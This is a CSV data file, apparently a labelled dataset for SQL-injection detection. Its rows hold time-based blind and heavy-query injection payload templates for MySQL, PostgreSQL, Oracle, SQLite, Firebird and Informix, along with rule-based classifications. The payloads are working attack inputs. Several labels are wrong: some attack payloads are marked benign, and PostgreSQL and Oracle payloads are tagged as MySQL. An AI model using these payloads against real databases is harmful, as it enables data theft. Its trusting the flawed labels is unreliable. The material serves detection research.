row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41290,AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END),1,time_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41291,OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END),1,time_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41292,"AND [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000)) AND [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1)))",1,time_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41293,"OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000)) OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1)))",1,time_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41294,"PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1) PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)",1,time_blind,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
41295,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END) (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END),1,time_blind,time_blind,mysql,0.95,SLEEP( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41296,"(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF([INFERENCE],0,[SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41297,"(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]) (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])",1,time_blind,time_blind,generic,0.95,BENCHMARK( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41298,"(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])",1,time_blind,heavy_query,mysql,0.95,"SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA detected — heavy_query injection (priority 6) on mysql",rule-based
41299,([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME])) ([INFERENCE] AND SLEEP([SLEEPTIME])),1,time_blind,time_blind,mysql,0.95,"SLEEP(, AND SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41300,"ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) ELT([INFERENCE],SLEEP([SLEEPTIME]))",1,time_blind,time_blind,mysql,0.95,SLEEP( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41301,"MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))",1,time_blind,time_blind,mysql,0.95,SLEEP( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41302,(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),1,time_blind,time_blind,mysql,0.95,"SLEEP(, PG_SLEEP( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41303,"(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",1,time_blind,heavy_query,generic,0.95,GENERATE_SERIES( detected — heavy_query injection (priority 6) on generic,rule-based
41304,"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)) (SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))",1,time_blind,heavy_query,generic,0.95,"SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)) (SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
41305,BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;,1,time_blind,time_blind,mysql,0.95,"SLEEP(, IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41306,"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)",1,time_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41307,"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)",1,time_blind,heavy_query,oracle,0.95,"SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS detected — heavy_query injection (priority 6) on oracle",rule-based
41308,"(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) (SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))",1,time_blind,time_blind,sqlite,0.95,RANDOMBLOB( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41309,"(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",1,time_blind,heavy_query,firebird,0.95,"SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB detected — heavy_query injection (priority 6) on firebird",rule-based
